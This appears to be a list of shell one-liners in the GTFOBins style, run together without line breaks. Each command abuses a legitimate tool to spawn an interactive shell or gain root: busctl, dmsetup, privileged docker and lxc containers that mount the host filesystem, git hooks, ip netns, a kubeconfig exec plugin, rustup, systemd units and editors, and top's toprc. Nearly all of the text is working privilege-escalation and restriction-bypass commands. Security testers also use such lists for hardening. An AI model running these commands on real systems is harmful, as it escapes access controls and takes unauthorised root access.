Command: busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
dmsetup create base <<EOF 0 3534848 linear /dev/loop0 94208 EOF dmsetup ls --exec '/bin/sh -s'
docker run --rm -it --privileged -u root alpine mount /dev/sda1 /mnt/ ls -la /mnt/ chroot /mnt /bin/bash
git init . echo 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit chmod +x .git/hooks/pre-commit git -C . commit --allow-empty -m x
ip netns add foo ip netns exec foo /bin/sh ip netns delete foo
ip netns add foo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar ip netns exec bar /bin/sh ip netns delete foo ip netns delete bar

cat >/path/to/temp-file <<EOF clusters: - cluster: server: https://x name: x contexts: - context: cluster: x user: x name: x current-context: x users: - name: x user: exec: apiVersion: client.authentication.k8s.io/v1 interactiveMode: Always command: /bin/sh args: - '-c' - '/bin/sh 0<&2 1>&2' EOF kubectl get pods --kubeconfig=/path/to/temp-file
lxc init ubuntu:16.04 x -c security.privileged=true lxc config device add x x disk source=/ path=/mnt/ recursive=true lxc start x lxc exec x /bin/sh
lxc image import ./alpine*.tar.gz --alias x lxc init x x -c security.privileged=true lxc config device add x x disk source=/ path=/mnt/ recursive=true lxc start x lxc exec x /bin/sh
mkdir /path/to/temp-dir/bin/ mkdir /path/to/temp-dir/lib/ cp /bin/sh /path/to/temp-dir/bin/rustc rustup toolchain link x /path/to/temp-dir/ rustup run x rustc

echo '[Service] Type=oneshot ExecStart=/path/to/command [Install] WantedBy=multi-user.target' >/path/to/temp-file.service systemctl link /path/to/temp-file.service systemctl enable --now /path/to/temp-file.service
echo /bin/sh >/path/to/temp-file chmod +x /path/to/temp-file SYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target
echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc top # press return twice reset
